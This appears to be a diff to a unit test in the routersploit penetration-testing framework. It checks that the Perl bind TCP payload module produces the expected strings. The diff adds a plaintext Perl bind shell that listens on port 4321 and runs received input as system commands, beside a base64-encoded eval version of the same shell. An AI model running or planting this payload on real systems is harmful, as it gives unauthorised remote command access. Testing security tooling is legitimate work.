@@ -1,8 +1,17 @@
-from routersploit.modules.payloads.perl.bind_tcp import Exploit
+from routersploit.modules.payloads.perl.bind_tcp import Payload
 
 
 # perl bind tcp payload with rport=4321
 bind_tcp = (
+    "use IO;foreach my $key(keys %ENV){" +
+    "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
+    "4321" +
+    ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
+    "if($_=~ /(.*)/){system $1;}};"
+)
+
+# perl bind tcp payload with rport=4321 encoded with perl/base64
+bind_tcp_encoded = (
     "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0MzIxLFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTs='));"
 )
 
@@ -10,7 +19,8 @@ bind_tcp = (
 def test_payload_generation():
     """ Test scenario - payload generation """
 
-    payload = Exploit()
+    payload = Payload()
     payload.rport = 4321
 
     assert payload.generate() == bind_tcp
+    assert payload.run() == bind_tcp_encoded
